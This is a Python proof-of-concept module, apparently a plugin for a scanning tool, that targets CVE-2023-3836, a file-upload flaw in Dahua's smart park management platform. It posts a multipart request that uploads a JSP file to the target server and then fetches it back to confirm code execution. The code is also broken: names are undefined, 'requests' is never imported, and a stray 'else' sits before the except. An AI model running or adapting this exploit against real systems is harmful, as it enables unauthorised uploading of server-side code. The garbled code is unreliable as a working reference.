import os
import json
from requests.auth import HTTPDigestAuth

from loguru import logger

from .base import POCTemplate
from Ingram.utils import common


class CVE_2023_3836(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['dahua']
        self.product_version = ''
        self.ref = """
        https://github.com/zh-byte/CVE-2023-3836/blob/main/CVE-2023-3836.py
        """
        self.level = POCTemplate.level.high
        self.desc = """
        大华智慧园区综合管理平台publishing文件上传POC--CVE_2023_3836
        """

    def verify(self, ip, port=80):
        url =  f"http://{ip}:{port}/Security/users?auth=YWRtaW46MTEK"
        header = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15", "Content-Type": "multipart/form-data; boundary=dd8f988919484abab3816881c55272a7", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
        data = "--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"0EaE10E7dF5F10C2.jsp\"\r\n\r\n<%out.println(\"vultest\");%>\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"poc\"\r\n\r\npoc\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nsubmit\r\n--dd8f988919484abab3816881c55272a7--"

        try:
            response = requests.post(url_end, headers=headers, data=data, verify=False,timeout=4)
            dict = json.loads(response.text)
            path = dict["data"]["path"]
            url = url+"/publishingImg/"+path
            text = requests.get(url,verify = False).text
            if "vultest" in text:
                print(f"{url}存在漏洞")
        else:
            print(f"{url}不存在漏洞")
        except Exception as e:
            logger.error(e)
        finally:
            if os.path.exists(json_file):
                os.remove(json_file)
        return None


    


POCTemplate.register_poc(CVE_2023_3836)